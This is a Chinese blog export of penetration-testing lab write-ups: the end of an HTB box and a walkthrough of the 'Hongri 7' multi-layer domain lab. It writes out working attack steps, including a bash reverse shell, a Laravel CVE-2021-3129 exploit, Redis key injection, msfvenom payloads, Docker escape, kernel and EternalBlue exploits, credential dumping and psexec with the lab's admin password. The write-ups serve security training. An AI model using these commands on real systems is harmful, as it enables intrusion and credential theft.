href="https://blog.51cto.com/u_9019400/2385520">https://blog.51cto.com/u_9019400/2385520</a><br>这个yml是在做文件备份<br>所以创建一个指向luis的id_rsa的软链接文件，我们可以把它放到/uploads目录中<br>命令：ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa<br>然后可以在/opt/backups/archives下看到gz文件 然后解压</p><p><img src="https://api2.mubu.com/v3/document_image/b07fff18-584f-4832-9536-f574187a182d-11763069.jpg" alt="image"></p><p>然后将压缩文件复制到tmp目录下</p><p><img src="https://api2.mubu.com/v3/document_image/6c79b3c5-0b49-46bc-863b-f69cb3f7a51f-11763069.jpg" alt="image"></p><p>然后解压</p><p><img src="https://api2.mubu.com/v3/document_image/b7273e7e-f623-4846-940f-7837c4a8343f-11763069.jpg" alt="image"></p><p>命令：tar -xvf t.tar.gz<br>切换到uploads目录然后查看id_rsa</p><p><img src="https://api2.mubu.com/v3/document_image/b4ad96ff-504b-4f06-aa07-2ed63af10c70-11763069.jpg" alt="image"></p><p>保存到本地<br>然后ssh 连接 但是在连接之前 需要给chmod 600</p><p><img src="https://api2.mubu.com/v3/document_image/b6c2b9bb-ea27-48a0-8785-42b108d07bd4-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/b6b37585-cf9f-4f9f-81de-ebe7eed1883b-11763069.jpg" alt="image"></p><p>然后成功查看user.txt<br>cat user.txt</p><p><img src="https://api2.mubu.com/v3/document_image/a6d81b90-6565-4458-83b0-e82fead6d365-11763069.jpg" alt="image"></p><h3 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h3><h4 id="第一种提权"><a href="#第一种提权" class="headerlink" title="第一种提权"></a>第一种提权</h4><p>sudo -l</p><p><img src="https://api2.mubu.com/v3/document_image/f957f7a8-8146-4d56-b456-764a8b29e640-11763069.jpg" alt="image"></p><p>发现luis不用密码就可以以root 执行ansible-playebook<br>直接在提权网址发现一个提权方式</p><p><img src="https://api2.mubu.com/v3/document_image/0d3bbb89-734b-48b7-a116-560d99c76d46-11763069.jpg" alt="image"></p><p>命令：<br>TF=$(mktemp)<br>echo ‘[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]‘ &gt;$TF<br>sudo ansible-playbook $TF</p><p>这样提权太快了<br>提权网址：<a href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p><h4 id="第二种提权："><a href="#第二种提权：" class="headerlink" title="第二种提权："></a>第二种提权：</h4><p>创建一个root.yml文件</p><p><img src="https://api2.mubu.com/v3/document_image/131e07c9-d29f-451e-88a7-f313652ecf64-11763069.jpg" alt="image"></p><p>然后：sudo /usr/bin/ansible-playbook root.yml</p><p><img src="https://api2.mubu.com/v3/document_image/78c8a8b9-bcf1-4bfd-8a83-57e9b5040a71-11763069.jpg" alt="image"></p><h4 id="第三种则是直接复制root-txt-也是创建yml文件"><a href="#第三种则是直接复制root-txt-也是创建yml文件" class="headerlink" title="第三种则是直接复制root.txt 也是创建yml文件"></a>第三种则是直接复制root.txt 也是创建yml文件</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">name:</span> Ansible Copy Example Local to Remote<br><span class="hljs-symbol">hosts:</span> localhost<br><span class="hljs-symbol">tasks:</span><br><span class="hljs-symbol">    name:</span> copying file with playbook<br><span class="hljs-symbol">    become:</span> true<br><span class="hljs-symbol">    copy:</span><br><span class="hljs-symbol">    src:</span> <span class="hljs-meta-keyword">/root/</span>root.txt<br><span class="hljs-symbol">    dest:</span> <span class="hljs-meta-keyword">/dev/</span>shm<br><span class="hljs-symbol">    owner:</span> luis<br><span class="hljs-symbol">    group:</span> luis<br><span class="hljs-symbol">    mode:</span> <span class="hljs-number">0777</span><br></code></pre></td></tr></table></figure><p>使用sudo /usr/bin/ansible-playbook执行root.yml文件<br>然后在dev/shm下找到root.txt</p><p><img src="https://api2.mubu.com/v3/document_image/3c9eb4c1-9696-4843-a169-b90ae0efeebe-11763069.jpg" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这两个靶机 还是学到了不少 ssrf的利用 通过返回包看见a标签里面有一个路径 然后ssrf读取 发现密钥 到最后通过 pdb提权<br>以及tomcat的..;绕过的方式 然后上传war 拿下shell 以及后面的利用ansible-playbook提权<br>最后 还是知识面不够阿<br>有什么不足 写得不对的地方 求师傅们指点</p>]]></content>
    
    
    <categories>
      
      <category>HTB靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日7</title>
    <link href="/2021/10/30/%E7%BA%A2%E6%97%A57/"/>
    <url>/2021/10/30/%E7%BA%A2%E6%97%A57/</url>
    
    <content type="html"><![CDATA[<ul><li><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图<img src="https://api2.mubu.com/v3/document_image/0ab4d441-cfe7-4ead-b4e7-942d60e0bea9-11763069.jpg" alt="img"></h2></li><li><p>环境配置</p><ul><li><p>DMZ区IP段为192.168.43.1/24  因为我这里是开热点打的  图用的网上的</p></li><li><p>第二层网络环境IP段为192.168.52.1/24</p></li><li><p>第三层网络环境IP段为192.168.93.1/24</p></li><li><p>DMZ区域</p><ul><li>Ubuntu（Web 1）配置了两个网卡，一个桥接可以对外提供服务，IP段设为 192.168.43.0/24，一个连接在 VMnet8 上，设为NAT模式，IP段设为 192.168.52.0/24 连通第二层网络</li></ul></li><li><p>第二层网络区域</p><ul><li>Ubuntu（Web 2）和 Windows 7（PC 1）都配置了两个网卡，一个连接在 VMnet8 上连通第二层网络，一个连接在 VMnet14 上，设为仅主机模式，IP段设为 192.168.93.0/24 连通第三层网络</li></ul></li><li><p>第三层网络区域</p><ul><li>Windows Server 2012 和 Windows 7（PC 2）都只配置了一个网卡，连接在 VMnet14 上连通第三层网络</li></ul></li><li><p>用户名密码</p><ul><li><p>域用户账户和密码如下：</p><ul><li><p>Administrator：Whoami2021</p></li><li><p>whoami：Whoami2021</p></li><li><p>bunny：Bunny2021</p></li><li><p>moretz：Moretz2021</p></li></ul></li><li><p>Ubuntu 1：</p><ul><li>web：web2021</li></ul></li><li><p>Ubuntu 2：</p><ul><li>ubuntu：ubuntu</li></ul></li><li><p>通达OA账户（不重要）：</p><ul><li>admin：admin657260</li></ul></li></ul></li><li><p>后面的网卡设置好就行<img src="https://api2.mubu.com/v3/document_image/0ffa7885-4057-4958-ba2c-82b9dc9a6d72-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/8524599a-b22e-4362-bc3d-50087ec92504-11763069.jpg" alt="img"></p></li><li><p>网络配置好了 还需要配置服务</p><ul><li><p>DMZ区的 Ubuntu 需要启动redis和nginx服务（经过后面的心酸，这里的redis得用root权限启动）：</p><ul><li><p>sudo su</p></li><li><p>redis-server /etc/redis.conf</p></li><li><p>/usr/sbin/nginx -c /etc/nginx/nginx.conf</p></li><li><p>iptables -F</p></li></ul></li><li><p>第二层网络的 Ubuntu需要启动docker容器（仍然需要root）：</p><ul><li><p>sudo su</p></li><li><p>service docker start</p></li><li><p>docker start 8e172820ac78</p></li></ul></li><li><p>第二层网络的 Windows 7 （PC 1）需要启动通达OA（这个得用administrator启动哦，并且要关闭防火墙）：</p><ul><li>C:\MYOA\bin\AutoConfig.exe</li></ul></li><li><p>开始配置<img src="https://api2.mubu.com/v3/document_image/a8a03216-3bc4-4008-9f04-ff43c74cb0b0-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/76e130ea-f7f1-4a2a-8e99-5b8ac27823f3-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/a6a6ab8e-0700-45d6-9d40-49b8b8e8e51a-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/60f55f3c-f7b9-4f7d-ac5d-45576eba5c4f-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/b5a024b9-365f-4494-b793-e8823ddfaca7-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/438093c2-d3fa-4726-bde1-b574b6ab35a3-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/51c403de-e3bf-4a78-ae79-c201d793ba7b-11763069.jpg" alt="img"></p></li><li><p>至此 环境配置完成</p></li></ul></li></ul></li><li><h2 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h2><ul><li><h3 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h3></li><li><p>拿到DMZ的ip：192.168.43.129  首先打开看看<img src="https://api2.mubu.com/v3/document_image/6149f886-b4cc-492d-ab9e-6472749e89d8-11763069.jpg" alt="img"></p></li><li><p>空白啥都没有 但是网上的那些有blog不知道怎么回事 先不管 扫端口</p><ul><li>命令：nmap -T4 -A 192.168.31.132 -p 1-65535</li></ul></li><li><p>扫出4个端口</p><ul><li><p>22的ssh</p></li><li><p>80的nginx</p></li><li><p>81的Laravel</p></li><li><p>6379的redis</p></li></ul></li><li><p>因为80没东西 所以打开81看看<img src="https://api2.mubu.com/v3/document_image/bc53168d-600d-4663-bbbc-67cc79b4f026-11763069.jpg" alt="img"></p></li><li><p>是一个Laravel v8.29.0（一个简洁、开源的 PHP Web 开发框架）</p></li><li><p>直接网上找找公开漏洞</p></li><li><p>发现是有漏洞的CVE-2021-3129 然后直接找exp打</p></li><li><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p></li><li><p>克隆exp到kali</p><ul><li>命令：git clone git://<a href="http://github.com/crisprss/Laravel_CVE-2021-3129_EXP.git">github.com/crisprss/Laravel_CVE-2021-3129_EXP.git</a> </li></ul></li><li><p>然后将里面默认的url改为目标192.168.43.129<img src="https://api2.mubu.com/v3/document_image/3f49205e-0c3d-4e59-8d33-d13d7e5eb998-11763069.jpg" alt="img"></p></li><li><p>然后克隆phpggc到exp目录下 因为需要同目录<img src="https://api2.mubu.com/v3/document_image/49b884bf-81e7-4056-97cf-3e15d8dd53ce-11763069.jpg" alt="img"></p></li><li><p> 命令：git clone git://<a href="http://github.com/ambionics/phpggc.git">github.com/ambionics/phpggc.git</a> </p></li><li><p>然后执行命令：python3 exploit.py<img src="https://api2.mubu.com/v3/document_image/d724b4b0-863d-4b65-a906-057a540ae43c-11763069.jpg" alt="img"></p></li><li><p>然后改一下py脚本 改成任意执行命令</p></li><li><p>Vim打开脚本，首先在exploit.py开头import sys库 <img src="https://api2.mubu.com/v3/document_image/fbf5061b-b018-45d0-b3f1-7483fdf3c2b8-11763069.jpg" alt="img"></p></li><li><p>主函数改为如下内容（注意缩进）</p></li><li><p>args = sys.argv</p></li><li><p>url = args[1]</p></li><li><p>command = args[2]</p></li><li><p>Exp(url, command) <img src="https://api2.mubu.com/v3/document_image/053c9894-12c6-4188-833d-504ecb4d9a1e-11763069.jpg" alt="img"></p></li><li><p>然后执行命令<img src="https://api2.mubu.com/v3/document_image/7dc61f89-c3d4-4127-b44c-5a2c5b99776d-11763069.jpg" alt="img"></p></li><li><p>然后写shell  但是用这个exp一直写不上 就换了一个exp </p></li><li><p>直接写shell的 <img src="https://api2.mubu.com/v3/document_image/d0d9b178-3707-47b9-bb5d-d161cfdd2e47-11763069.jpg" alt="img"></p></li><li><p>然后用哥斯拉链接2.92版本的  3.03不知道为什么连不上</p><ul><li><a href="https://github.com/BeichenDream/Godzilla%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80![img](https://api2.mubu.com/v3/document_image/0da58803-a684-4754-8074-e948169b698d-11763069.jpg)">https://github.com/BeichenDream/Godzilla下载地址![img](https://api2.mubu.com/v3/document_image/0da58803-a684-4754-8074-e948169b698d-11763069.jpg)</a></li></ul></li><li><p>连上shell<img src="https://api2.mubu.com/v3/document_image/78756e96-47c7-4cb8-b923-e9aeef82a494-11763069.jpg" alt="img"></p></li><li><p>首先判断当前环境和权限  发现有些命令无法执行 怀疑是在容器里面</p></li><li><p>判断是否为docker<img src="https://api2.mubu.com/v3/document_image/b1e6a315-d306-4a61-9e57-ddbe15673d57-11763069.jpg" alt="img"></p></li><li><p>确实是在docker里面  所以就需要进行docker逃逸</p></li><li><p>但是当前权限较低<img src="https://api2.mubu.com/v3/document_image/a7ca5173-823c-4dee-b3e5-78f8e7b2c218-11763069.jpg" alt="img"></p></li><li><p>所以需要进行提权 先通过命令来搜索具有SUID或4000权限的文件：</p><ul><li>find / -perm -u=s -type f 2&gt;/dev/null<img src="https://api2.mubu.com/v3/document_image/e280d9c1-1dcb-4c2a-87c3-75578f8aef60-11763069.jpg" alt="img"></li></ul></li><li><p>发现 /home/jobs/shell 文件比较特别  然后切换到目录看看 </p></li><li><p>但是发现在哥斯拉执行的时候切换不了 不知道什么情况 那就先弹个会话到kali</p><ul><li>命令：bash -c “bash -i &gt;&amp; /dev/tcp/192.168.43.35/1234 0&gt;&amp;1”</li></ul></li><li><p>然后在kali上试试能不能行<img src="https://api2.mubu.com/v3/document_image/6cf4aac4-9164-4005-900d-36ca6ab2c56c-11763069.jpg" alt="img"></p></li><li><p>然后通过查看demo.c文件发现 是调用的ps命令且并未使用绝对路径<img src="https://api2.mubu.com/v3/document_image/d3a264f7-1916-478a-af08-05bfe78a23c6-11763069.jpg" alt="img"></p></li><li><p>那么尝试更改$PATH来执行恶意程序，从而获得目标主机的 root 权限 shell</p><ul><li><p>cd /tmp</p></li><li><p>echo “/bin/bash” &gt; ps</p></li><li><p>chmod 777 ps</p></li><li><p>echo $PATH</p></li><li><p>export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</p></li><li><p>cd /home/jobs</p></li><li><p>./shell# 然后就获得了root权限，可以执行命令了</p></li></ul></li><li><p>然后先弹个root的会话<img src="https://api2.mubu.com/v3/document_image/46df80e3-c622-4a2d-921b-1e195cd654c1-11763069.jpg" alt="img"></p></li><li><p>然后使用特权模式进行docker逃逸</p><ul><li><p>先fdisk -l查看磁盘挂载<img src="https://api2.mubu.com/v3/document_image/8150dc0b-8819-462e-97d2-7c2aaefdfd89-11763069.jpg" alt="img"></p></li><li><p>sda1盘疑似挂载于宿主机上，利用mount挂载于我们创建的目录之上<img src="https://api2.mubu.com/v3/document_image/345a0738-4500-4f0a-a414-2e980f86cbc8-11763069.jpg" alt="img"></p></li><li><p>然后ls hack就可以看到宿主机部分文件<img src="https://api2.mubu.com/v3/document_image/d6cf4391-335a-40dc-8bcf-5cabb4e4bce7-11763069.jpg" alt="img"></p></li><li><p>来到/hack/home/ubuntu下 可以看到有.ssh文件<img src="https://api2.mubu.com/v3/document_image/43dd5919-f695-4f38-ba20-bff005a23c1a-11763069.jpg" alt="img"></p></li><li><p>那就可以写入密钥</p></li><li><p>先在kali中生成密钥  创建一个key文件<img src="https://api2.mubu.com/v3/document_image/404f1c8f-af9c-4103-b671-e244711e3722-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/d758c35f-8167-4a8e-814f-bcfda4ebc79e-11763069.jpg" alt="img"></p></li><li><p>然后将密钥复制</p></li><li><p>然后写入目标的.ssh目录下<img src="https://api2.mubu.com/v3/document_image/08240270-a730-4788-abb3-9b25ec86598c-11763069.jpg" alt="img"></p></li><li><p>命令：cp -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys(我这里是切换到.ssh目录下复制的 因为我直接全路径不知道为什么失败)(后来发现是hack前面不需要/)</p></li><li><p>然后写入到authorized_keys里面<img src="https://api2.mubu.com/v3/document_image/3dd70c5a-6e2f-4efe-887d-bf7797d28e5e-11763069.jpg" alt="img"></p></li><li><p>然后用kali连接ubuntu</p></li><li><p>但是发现还是需要密码 这就奇怪了<img src="https://api2.mubu.com/v3/document_image/7d9ca86d-79da-48e6-bf4f-eb4a176cffc7-11763069.jpg" alt="img"></p></li><li><p>然后换思路 因为发现还有6379 有redis 所以从redis搞</p></li></ul></li><li><p>redis未授权</p><ul><li><p>先安装redis-cli工具</p><ul><li><p>wget <a href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a></p></li><li><p>tar -zxvf redis-stable.tar.gz</p></li><li><p>cd redis-stable</p></li><li><p>make //全局生效 </p></li><li><p>cp src/redis-cli /usr/bin/</p></li></ul></li><li><p>然后连接</p><ul><li>redis-cli -h 192.168.43.129<img src="https://api2.mubu.com/v3/document_image/ddbf17f9-6b08-421f-943d-56c93d24988d-11763069.jpg" alt="img"></li></ul></li><li><p>尝试用redis写入ssh公钥</p><ul><li><p>kali生成ssh公钥</p><ul><li>ssh-keygen -t rsa</li></ul></li><li><p>将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里：</p><ul><li><p>(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p></li><li><p>cat key.txt | redis-cli -h 192.168.43.129 -x set hello</p></li></ul></li><li><p>然后进入redis将公钥写入（这里redis要是不用root启，就不行）</p><ul><li><p>config set dir /root/.ssh                #设置redis的备份路径为/root/.ssh/</p></li><li><p>config set dbfilename authorized_keys    #设置保存文件名为authorized_keys</p></li><li><p>save        #将数据保存在目标服务器硬盘上</p></li><li><p>ssh 192.168.213.188                      #连接     <img src="https://api2.mubu.com/v3/document_image/58e81d3e-52e8-4498-9bf5-de8d9740be02-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/953b5607-78d6-492d-b7a7-da89a3d12a85-11763069.jpg" alt="img"></p></li><li><p>直接连上了</p></li></ul></li></ul></li></ul></li><li><p>docker逃逸失败的原因</p><ul><li><p>因为开始确确实实是把ssh公钥写入了 但是怎么会连不上哎 然后查看了下nginx的配置<img src="https://api2.mubu.com/v3/document_image/d3397343-245d-48d4-a485-8ac83face579-11763069.jpg" alt="img"></p></li><li><p>发现了 nginx 反向代理的标志 proxy_pass</p></li><li><p>攻击的机器192.168.43.129（192.168.52.10）服务器上的 nginx 将 81 端口收到的请求转发给了 192.168.52.20，将 80 端口收到的请求转发给了 <a href="http://whoamianony.top/">http://whoamianony.top</a></p></li><li><p>所以这个docker的宿主机的192.168.20.20上 就算公钥写进去了 但是连不上 不在同一个网段 那个是</p></li><li><p>如果说192.168.43.129(192.168.52.10)是A机器  192.168.52.20是B机器  docker是B1</p></li><li><p>那么我们开始用马子拿下的就是B中的B1  redis拿下的才是A </p></li></ul></li><li><p>docker再次逃逸（柳暗花明）</p><ul><li><p>还是先把这个上线msf 以便后续操作</p></li><li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.35 LPORT=3333 -f elf &gt; web.elf<img src="https://api2.mubu.com/v3/document_image/ae4a6dfb-37cb-4638-bd3a-90a808f6e17c-11763069.jpg" alt="img"></p></li><li><p>然后远程下载马子<img src="https://api2.mubu.com/v3/document_image/3837ff79-a495-4d49-bc70-5f2b2c80086b-11763069.jpg" alt="img"></p></li><li><p>然后msf开启监听</p><ul><li><p>use exploit/multi/handler</p></li><li><p>set lhost 192.168.31.96</p></li><li><p>set lport 3333</p></li><li><p>set payload linux/x86/meterpreter/reverse_tcp</p></li><li><p>run</p></li></ul></li><li><p>然后执行上线<img src="https://api2.mubu.com/v3/document_image/77a895b0-777d-4d34-a257-1ca4f8cad031-11763069.jpg" alt="img"></p></li><li><p>因为开始第一步我们就将公钥写进去192.168.50.20了  是不是我们可以直接将kali的公钥下载到拿下的A机器 然后直接连接  但是还是要输入密码 很奇怪 按道理我看网上的有人是可以成功的 这里我没成功 就不管了<img src="https://api2.mubu.com/v3/document_image/cbcf319a-8540-4a39-8fdd-a1616619ee41-11763069.jpg" alt="img"></p></li><li><p>然后我重新试了一下 还是成功连上了  可能是因为我第一天关机了原因  <img src="https://api2.mubu.com/v3/document_image/440f5e8a-476f-4f30-8bde-cd1b3db0a12f-11763069.jpg" alt="img"></p></li><li><p>重新通过第一步的shell写密钥到192.168.52.20上 然后下载kali的公钥连接上了</p></li><li><p>这里既然连接上了 就不用另一种方法了</p></li><li><p>但还是介绍一下另一种方法</p></li><li><p>我们通过redis拿下了192.168.43.129(192.168.52.10)这一台  这一台和192.168.52.20 有共同的网段的是可以直接连的   所以就可以通过shell弹一个会话到43.129这一台机器上 然后在这一台机器上进行docker提权以及 特权模式逃逸  直接在129这一台机器上生成密钥 然后写入到52.20中 然后连接进行逃逸</p></li></ul></li><li><p>所以到现在已经拿下了两台</p><ul><li><p>拿到了web，192.168.43.129；192.168.52.10</p></li><li><p>拿到了ubuntu，192.168.52.20；192.168.93.10</p></li></ul></li><li><p>但192.168.52.20是ubuntu用户权限不高 我们要得肯定是root最好 先进行信息收集看看能不能提权<img src="https://api2.mubu.com/v3/document_image/44ee80bb-7863-4db2-b671-216145e2205a-11763069.jpg" alt="img"></p></li><li><p>14.04 刚好上次打靶场的时候遇到 这个版本可以提权用<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p></li><li><p>漏洞利用 exp 下载地址：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p></li><li><p>漏洞影响版本：</p><ul><li><p>Ubuntu 20.10</p></li><li><p>Ubuntu 20.04 LTS</p></li><li><p>Ubuntu 18.04 LTS</p></li><li><p>Ubuntu 16.04 LTS</p></li><li><p>Ubuntu 14.04 ESM</p></li></ul></li><li><p>直接将下载的exp的内容复制到 这台机器编译一个</p><ul><li><p>cd /tmp</p></li><li><p>vim exploit.c             #将下载的exploit.c内容粘贴到该文件中</p></li><li><p>gcc exploit.c -o exploit</p></li><li><p>chmod +x exploit</p></li><li><p>./exploit<img src="https://api2.mubu.com/v3/document_image/8d4f132a-7877-4c3a-ba4e-1797418f1ecc-11763069.jpg" alt="img"></p></li><li><p>提权成功  然后现在上线msf进行内网渗透</p></li></ul></li><li><p>先添加一个路由 这台是192.168.43.129<img src="https://api2.mubu.com/v3/document_image/93e263a0-d090-47a2-bb42-01d28ede90fb-11763069.jpg" alt="img"></p></li><li><p>然后生成一个马子 </p><ul><li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.35 LPORT=4445 -f elf &gt; ubuntu.elf</p></li><li><p>然后远程下载 发现是可以下载的 说明可以出网</p></li><li><p>如果这里不能出网的话就需要通过先把马子传到192.168.43.129上 然后在下载到52.20这一台上 这也的话 马子也需要重新生成 设置代理</p></li></ul></li><li><p>然后下载执行上线<img src="https://api2.mubu.com/v3/document_image/48b36eca-fea8-47f8-ae1c-ee639471ed27-11763069.jpg" alt="img"></p></li><li><p>好了现在都上线了 开启socks代理探测内网</p></li><li><h3 id="第二层内网渗透"><a href="#第二层内网渗透" class="headerlink" title="第二层内网渗透"></a>第二层内网渗透</h3><ul><li><p>首先扫描一下第二层网络（192.168.52.0/24）是否有存活 windows 主机</p><ul><li><p>use auxiliary/scanner/discovery/udp_probe</p></li><li><p>set rhosts 192.168.52.1-255</p></li><li><p>set threads 5</p></li><li><p>run<img src="https://api2.mubu.com/v3/document_image/b5bcc847-38ac-4ed6-adcd-66c7b6eb4433-11763069.jpg" alt="img"></p></li><li><p>发现了一台30的机器 </p></li></ul></li><li><p>直接挂socks 进一步探测信息</p><ul><li><p>use auxiliary/server/socks_proxy</p></li><li><p>set srvhost 192.168.43.35</p></li><li><p>set version 4a socks版本   </p></li><li><p> run    <img src="https://api2.mubu.com/v3/document_image/7dbe4a44-bdbe-4c3f-b862-28dc71692310-11763069.jpg" alt="img"></p></li></ul></li><li><p>发现有个8080端口 然后浏览器开启代理打开看看<img src="https://api2.mubu.com/v3/document_image/eb5e2224-3149-40e0-8425-149cfb28f0f1-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/98d547fe-caea-488a-9ca1-a74c67f8f342-11763069.jpg" alt="img"></p></li><li><p>发现是一个通达OA V11.3  然后直接通过exp直接上<img src="https://api2.mubu.com/v3/document_image/5df73035-fc26-4e73-b9aa-42c05db9fe70-11763069.jpg" alt="img"></p></li><li><p>上工具，这个工具有个坑，有个获取cookie的功能但是获取不了，只有自己去网页上粘cookie过来。成功获取到了shell       <img src="https://api2.mubu.com/v3/document_image/4ca31aad-7626-4f37-95f6-745395b306d0-11763069.jpg" alt="img"></p></li><li><p>然后上线msf </p><ul><li><p> use exploit/multi/script/web_delivery</p></li><li><p>set target 2</p></li><li><p>set payload windows/x64/meterpreter/reverse_tcp</p></li><li><p>set lhost 192.168.43.35</p></li><li><p>set lport 5555</p></li><li><p>run       <img src="https://api2.mubu.com/v3/document_image/2bd3d5c9-0dcd-4812-9c3d-fb708b68ff82-11763069.jpg" alt="img"></p></li><li><p>上线之后进行内网信息收集</p><ul><li><p>ipconfig /all   # 查看本机ip，所在域</p></li><li><p>route print     # 打印路由信息</p></li><li><p>net view        # 查看局域网内其他主机名</p></li><li><p>arp -a          # 查看arp缓存</p></li><li><p>net start       # 查看开启了哪些服务</p></li><li><p>net share       # 查看开启了哪些共享</p></li><li><p>net share ipc$  # 开启ipc共享</p></li><li><p>net share c$    # 开启c盘共享</p></li><li><p>net use \192.168.xx.xx\ipc$ “” /user:””    # 与192.168.xx.xx建立空连接</p></li><li><p>net use \192.168.xx.xx\c$ “密码” /user:”用户名”    # 建立c盘共享</p></li><li><p>dir \192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件</p></li><li><p>net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</p></li><li><p>net user                 # 查看本机用户列表</p></li><li><p>net user /domain         # 查看域用户</p></li><li><p>net localgroup administrators    # 查看本地管理员组（通常会有域用户）</p></li><li><p>net view /domain         # 查看有几个域</p></li><li><p>net user 用户名 /domain   # 获取指定域用户的信息</p></li><li><p>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</p></li><li><p>net group 组名 /domain    # 查看域中某工作组</p></li><li><p>net time /domain           // 主域服务器会同时作为时间服务器</p></li><li><p>net group “domain admins” /domain  # 查看域管理员的名字</p></li><li><p>net group “domain computers” /domain  # 查看域中的其他主机名</p></li><li><p>net group “doamin controllers” /domain  # 查看域控制器（可能有多台）</p></li><li><p>net group “Enterprise Admins” /domain    // 查看域管理员组</p></li></ul></li><li><p>.<img src="https://api2.mubu.com/v3/document_image/7065b21d-d96d-4b5f-a4cc-f42aac5af9b5-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/444e20c9-a60f-43f8-a281-19b166eb8e87-11763069.jpg" alt="img"></p></li><li><p>综合上面收集的信息，我们可知，目标网络环境存在一个名为<a href="http://whoamianony.org/">whoamianony.org</a>的域环境，域控制器主机名为<a href="http://dc.whoamianony.org/">DC.whoamianony.org</a>，IP为192.168.93.30，域管理员为Administrator。</p></li><li><p>然后迁移到64进程上进行抓密码<img src="https://api2.mubu.com/v3/document_image/4866beb9-916f-45fe-a1d0-d73d929a67a4-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/8b19a4d7-b2d4-40e7-aa4a-b6ded4fc5bf5-11763069.jpg" alt="img"></p></li><li><p>成功抓到域用户和域管理员的密码</p><ul><li><p>bunny：Bunny2021</p></li><li><p>administrator：Whoami2021</p></li></ul></li></ul></li></ul></li><li><h3 id="第三层内网渗透"><a href="#第三层内网渗透" class="headerlink" title="第三层内网渗透"></a>第三层内网渗透</h3><ul><li><p>添加93网段的路由<img src="https://api2.mubu.com/v3/document_image/ccf7a2ba-f316-4f2a-909a-e8ff00aecc7c-11763069.jpg" alt="img"></p></li><li><p>然后探测93网段存活机器</p><ul><li><p>use auxiliary/scanner/smb/smb_version</p></li><li><p>set rhosts 192.168.93.1-255</p></li><li><p>set threads 5</p></li><li><p>run<img src="https://api2.mubu.com/v3/document_image/178ef4b6-eefb-4e39-962c-ae3d1713dbf4-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/ed565e15-527f-4b07-9f7f-c4ba004793a1-11763069.jpg" alt="img"></p></li></ul></li><li><p>发现两台存活的windows 分别为DC（192.168.93.30）和PC2（192.168.93.40）</p></li><li><p>先扫端口 通过扫端口发现都开了445  那就测一测永恒之蓝</p><ul><li><p>use exploit/windows/smb/ms17_010_eternalblue</p></li><li><p>set rhosts 192.168.93.40</p></li><li><p>set payload windows/x64/meterpreter/bind_tcp</p></li><li><p>set lport 8888</p></li><li><p>exploit<img src="https://api2.mubu.com/v3/document_image/1302f1e9-8d10-4002-97c1-63e52038d632-11763069.jpg" alt="img"></p></li></ul></li><li><p>直接弹回会话了<img src="https://api2.mubu.com/v3/document_image/5d0aab65-d974-494e-aad5-18d629ab6ae4-11763069.jpg" alt="img"></p></li><li><p>第四台拿下 现在只剩下域控了  既然前面抓到了域管的密码 直接用psexec登录得了</p><ul><li><p>use exploit/windows/smb/psexec</p></li><li><p>set rhosts 192.168.93.30</p></li><li><p>set SMBUser administrator</p></li><li><p>set SMBPass Whoami2021</p></li><li><p>set payload windows/meterpreter/bind_tcp</p></li><li><p>set rhost 192.168.93.30</p></li><li><p>run</p></li></ul></li><li><p>失败了，应该是开了防火墙的原因。</p></li><li><p>没关系，我们已经有了域控的密码了，就可以控制第二层网络的Windows 7远程关闭域控的防火墙了。首先控制第二层网络的Windows 7与域控建立ipc连接：</p><ul><li>net use \192.168.93.30\ipc$ 